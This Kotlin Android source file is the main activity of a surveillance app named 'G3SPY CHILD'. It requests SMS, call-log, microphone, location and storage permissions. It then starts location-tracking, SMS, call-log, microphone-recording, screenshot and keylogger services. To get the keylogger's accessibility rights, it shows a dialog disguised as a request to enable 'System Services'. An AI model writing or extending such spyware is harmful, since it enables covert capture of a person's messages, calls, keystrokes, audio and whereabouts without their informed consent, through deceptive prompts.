package com.g3spy.child

import android.Manifest
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.core.app.ActivityCompat
import com.g3spy.child.services.*
import com.g3spy.child.ui.theme.*
import com.g3spy.child.util.PermissionUtil

class MainActivity : ComponentActivity() {
    
    private val requiredPermissions = arrayOf(
        Manifest.permission.INTERNET,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS
    )
    
    // Additional permissions for Android 10+ (API 29+)
    private val androidQPermissions = arrayOf(
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.ACTIVITY_RECOGNITION
    )

    private val PERMISSION_REQUEST_CODE = 12345
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Request permissions
        if (!PermissionUtil.hasPermissions(this, *requiredPermissions)) {
            ActivityCompat.requestPermissions(this, requiredPermissions, PERMISSION_REQUEST_CODE)
        }
        
        // Request additional permissions for Android Q+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (!PermissionUtil.hasPermissions(this, *androidQPermissions)) {
                ActivityCompat.requestPermissions(this, androidQPermissions, PERMISSION_REQUEST_CODE + 1)
            }
        }
        
        // Start services
        startMonitoringServices()
        
        setContent {
            G3SPYChildTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    CyberpunkChildUI()
                }
            }
        }
    }
    
    private fun startMonitoringServices() {
        // Start location tracking service
        startService(Intent(this, LocationService::class.java))
        
        // Start SMS monitoring service
        startService(Intent(this, SmsService::class.java))
        
        // Start Call Log monitoring service
        startService(Intent(this, CallLogService::class.java))
        
        // Start microphone recording service
        startService(Intent(this, MicRecordingService::class.java))
        
        // Start screenshot service
        startService(Intent(this, ScreenshotService::class.java))
        
        // Try to start keylogger service (requires user to enable in Accessibility Settings)
        startService(Intent(this, KeyloggerService::class.java))
        
        // Check if accessibility service is enabled and prompt user if needed
        if (!isAccessibilityServiceEnabled()) {
            showAccessibilityPrompt()
        }
    }
    
    /**
     * Checks if the accessibility service is enabled
     */
    private fun isAccessibilityServiceEnabled(): Boolean {
        val accessibilityManager = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = accessibilityManager.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        
        for (service in enabledServices) {
            if (service.id.contains(packageName) && service.id.contains("KeyloggerService")) {
                return true
            }
        }
        
        return false
    }
    
    /**
     * Shows a dialog prompting the user to enable the accessibility service
     */
    private fun showAccessibilityPrompt() {
        val dialogBuilder = AlertDialog.Builder(this)
            .setTitle("System Services Required")
            .setMessage("Please enable System Services in Accessibility Settings to ensure proper functionality.")
            .setPositiveButton("Open Settings") { _, _ ->
                // Open accessibility settings
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
            }
            .setNegativeButton("Later", null)
            .setCancelable(true)
        
        dialogBuilder.show()
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        // Check if we need to direct to settings for permissions
        if (requestCode == PERMISSION_REQUEST_CODE && !PermissionUtil.hasPermissions(this, *requiredPermissions)) {
            // Some permissions are still missing, prompt user to go to settings
            openAppSettings()
        }
    }
    
    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        val uri = Uri.fromParts("package", packageName, null)
        intent.data = uri
        startActivity(intent)
    }
}

@Composable
fun CyberpunkChildUI() {
    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(
                brush = Brush.verticalGradient(
                    colors = listOf(
                        CyberGradientStart,
                        CyberGradientMid,
                        CyberGradientEnd
                    )
                )
            )
            .padding(16.dp)
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .align(Alignment.Center),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            // Title with neon glow effect
            Text(
                text = "G3SPY CHILD",
                style = MaterialTheme.typography.displayLarge,
                color = NeonGreen,
                textAlign = TextAlign.Center,
                modifier = Modifier
                    .padding(bottom = 24.dp)
            )
            
            // Status card
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 8.dp)
                    .border(
                        width = 2.dp,
                        brush = Brush.horizontalGradient(
                            colors = listOf(NeonGreen, NeonBlue)
                        ),
                        shape = RoundedCornerShape(8.dp)
                    ),
                colors = CardDefaults.cardColors(
                    containerColor = CyberDarkSurface.copy(alpha = 0.7f)
                ),
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text(
                        text = "SYSTEM ACTIVE",
                        style = MaterialTheme.typography.titleLarge,
                        color = NeonGreen,
                        modifier = Modifier.padding(bottom = 8.dp)
                    )
                    
                    Text(
                        text = "Monitoring Services: RUNNING",
                        style = MaterialTheme.typography.bodyMedium,
                        color = CyberTextPrimary,
                        modifier = Modifier.padding(vertical = 4.dp)
                    )
                    
                    Text(
                        text = "Data Collection: ENABLED",
                        style = MaterialTheme.typography.bodyMedium,
                        color = CyberTextPrimary,
                        modifier = Modifier.padding(vertical = 4.dp)
                    )
                    
                    Text(
                        text = "Firebase Connection: SECURE",
                        style = MaterialTheme.typography.bodyMedium,
                        color = CyberTextPrimary,
                        modifier = Modifier.padding(vertical = 4.dp)
                    )
                    
                    Spacer(modifier = Modifier.height(16.dp))
                    
                    LinearProgressIndicator(
                        progress = 1f,
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(8.dp)
                            .clip(RoundedCornerShape(4.dp)),
                        color = NeonGreen,
                        trackColor = CyberDarkBg
                    )
                }
            }
            
            Spacer(modifier = Modifier.height(24.dp))
            
            // System info
            Text(
                text = "SYSTEM INFO",
                style = MaterialTheme.typography.titleMedium,
                color = NeonBlue,
                modifier = Modifier.padding(bottom = 8.dp)
            )
            
            // Create a grid of monitoring services
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceEvenly
            ) {
                StatusBox(title = "GPS", isActive = true)
                StatusBox(title = "SMS", isActive = true)
                StatusBox(title = "CALL", isActive = true)
            }
            
            Spacer(modifier = Modifier.height(8.dp))
            
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceEvenly
            ) {
                StatusBox(title = "MIC", isActive = true)
                StatusBox(title = "SCREEN", isActive = true)
                StatusBox(title = "KEYLOG", isActive = true)
            }
        }
        
        // Footer text
        Text(
            text = "SECURE CONNECTION ESTABLISHED",
            style = MaterialTheme.typography.bodySmall,
            color = CyberTextSecondary,
            modifier = Modifier
                .align(Alignment.BottomCenter)
                .padding(bottom = 16.dp)
        )
    }
}

@Composable
fun StatusBox(title: String, isActive: Boolean) {
    Box(
        modifier = Modifier
            .size(80.dp)
            .border(
                width = 1.dp,
                brush = Brush.horizontalGradient(
                    colors = listOf(
                        if (isActive) NeonGreen else CyberError,
                        if (isActive) NeonBlue else CyberError.copy(alpha = 0.7f)
                    )
                ),
                shape = RoundedCornerShape(4.dp)
            )
            .padding(1.dp)
            .background(
                color = CyberDarkSurface.copy(alpha = 0.5f),
                shape = RoundedCornerShape(4.dp)
            ),
        contentAlignment = Alignment.Center
    ) {
        Column(
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text(
                text = title,
                style = MaterialTheme.typography.labelMedium,
                color = if (isActive) NeonGreen else CyberError
            )
            
            Spacer(modifier = Modifier.height(4.dp))
            
            Text(
                text = if (isActive) "ACTIVE" else "OFFLINE",
                style = MaterialTheme.typography.labelSmall,
                color = if (isActive) CyberTextPrimary else CyberError
            )
        }
    }
}